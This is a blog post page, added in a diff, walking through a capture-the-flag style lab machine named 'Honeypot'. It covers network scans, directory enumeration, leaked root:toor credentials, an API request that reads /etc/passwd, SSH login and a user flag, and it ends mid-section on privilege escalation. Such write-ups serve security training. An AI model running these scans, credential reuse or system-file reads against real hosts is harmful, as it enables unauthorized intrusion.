@@ -1,0 +1,802 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334 主机探测123456789101112131415┌──(root㉿kali)-[~]└─# nmap -sn 192.168.2.0&#x2F;24                                           Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-30 22:13 CSTNma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Honeypot">
+<meta property="og:url" content="http://miao-sec.github.io/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Honeypot/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334 主机探测123456789101112131415┌──(root㉿kali)-[~]└─# nmap -sn 192.168.2.0&#x2F;24                                           Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-30 22:13 CSTNma">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302216582.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302222944.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302242775.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302245621.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302257792.png">
+<meta property="article:published_time" content="2025-06-30T15:30:32.000Z">
+<meta property="article:modified_time" content="2025-06-30T15:32:58.498Z">
+<meta property="article:author" content="Miao">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302216582.png">
+  
+  
+  
+  <title>Honeypot - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Honeypot"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-30 23:30" pubdate>
+          2025年6月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Honeypot</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00028s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00023s latency).<br>MAC Address: 08:00:27:D8:AE:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00044s latency).<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure>
+<p>IP地址为：<code>192.168.2.41</code></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.41                            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00046s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.10 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22和80</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.41 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00079s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Honeypot - \xE7\xBD\x91\xE7\xBB\x9C\xE5\xAE\x89\xE5\x85\xA8\xE8\xAF\xB1\xE6\x8D\x95\xE7\xB3\xBB\xE7\xBB\x9F<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.79 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302216582.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.41 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.41<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 35557]<br>/.html                (Status: 403) [Size: 277]<br>/user.txt             (Status: 200) [Size: 184]<br>/history.txt          (Status: 200) [Size: 118]<br>/api                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.41/api/]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>发现目录<code>user.txt</code>，<code>history.txt</code>，<code>api</code></p>
+<p>访问<code>user.txt</code>，是常见的Linux用户名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.41/user.txt <br>root<br>daemon<br>bin<br>sys<br><span class="hljs-built_in">sync</span><br>games<br>man<br>lp<br>mail<br>news<br>uucp<br>proxy<br>www-data<br>backup<br>list<br>irc<br>gnats<br>nobody<br>_apt<br>systemd-timesync<br>systemd-network<br>systemd-resolve<br>systemd-coredump<br>messagebus<br>sshd<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>history.txt</code>，提示一个<code>root:toor</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.41/history.txt<br>root:toor<br>[2025-06-29 03:29:21] IN: <span class="hljs-built_in">sudo</span> -l<br>[2025-06-29 03:29:21] IN: <span class="hljs-built_in">sudo</span> -l<br>OUT: -bash: <span class="hljs-built_in">sudo</span> -l: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>api</code>，里面存在一个<code>manage.php</code>，尝试访问提示我们需要账号和密码，根据<code>history.txt</code>里面的提示，尝试进行登录，成功进入到页面，页面里面是一段json代码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302222944.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="2、JSON代码"><a href="#2、JSON代码" class="headerlink" title="2、JSON代码"></a>2、JSON代码</h2><p>额，丢到AI里面看看是什么意思</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">这段响应的核心含义是：客户端请求了一个系统不支持的操作（或参数不合法），导致错误；同时系统列出了所有可用的操作及其规则，帮助客户端调整请求以符合要求。常见错误原因可能是：<br>- 请求的 `action` 名称拼写错误或未在 `available_actions` 中定义；<br>- 操作需要的参数缺失或格式错误（如 `file_view` 的 `path` 不在允许目录内）。<br></code></pre></td></tr></table></figure>
+<ul>
+<li><code>process_list</code>：列出所有正在运行的进程，无参数</li>
+<li><code>file_delete</code>	：删除指定路径的文件（限制：路径必须在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下），必选参数 path（文件路径）</li>
+<li><code>file_view</code>	查看指定路径文件的内容（限制：路径必须在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下）	必选参数 path（文件路径）</li>
+<li><code>directory_list</code>：列出指定目录下的内容（文件&#x2F;子目录），必选参数 path（目录路径）</li>
+<li><code>find_files</code>：在指定路径下按模式（如通配符）查找文件，必选参数 path（搜索路径）、pattern（匹配模式）</li>
+<li><code>server_info</code>：获取服务器的基础信息（如版本、配置等），无参数</li>
+<li><code>auth_stats</code>：获取认证相关的统计信息（如登录次数、失败尝试等），无参数</li>
+<li><code>recent_logs</code>	：获取最近的API活动日志（如请求时间、操作类型、用户等），无参数</li>
+<li><code>sys_info</code>：获取系统综合信息（如CPU&#x2F;内存&#x2F;磁盘使用率、网络状态等），无参数</li>
+</ul>
+<p>那直接构造一个可以执行的json请求<br>添加JSON的类型和结构体</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/manage.php HTTP/1.1<br>Host: 192.168.2.41<br>Cache-Control: max-age=0<br>Authorization: Basic cm9vdDp0b29y<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: <span class="hljs-string">&quot;application/json&quot;</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 81<br><br>&#123;<br>  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;file_view&quot;</span>,<br>  <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/passwd&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>/etc/passwd</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302242775.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>后面一直在尝试构造请求，去读取相关的文件，但除了几个特定的文件外均不可进行读取<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302245621.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>后面看了群主的WP视频，发现可以直接使用<code>root:toor</code>进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh root@192.168.2.41<br> _   _                                    _   <br>| | | | ___  _ __   ___ _   _ _ __   ___ | |_ <br>| |_| |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \ | | | &#x27;</span>_ \ / _ \| __|<br>|  _  | (_) | | | |  __/ |_| | |_) | (_) | |_ <br>|_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|<br>                        |___/|_|             <br>root@192.168.2.41<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">user@honeypot:/home/root# id</span><br><span class="hljs-string">uid=1001(xxxx) gid=1001(xxxx) groups=1001(xxxx)</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FALG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/home/root# <span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-02a6dcfe-54a3-11f0-ae46-77faa154db7c&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code>，提示命令没有找到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/home/root# <span class="hljs-built_in">sudo</span> -l<br>-bash: <span class="hljs-built_in">sudo</span> -l: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure>
+
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在<code>/opt/</code>目录下面找到一个<code>jail_v1</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 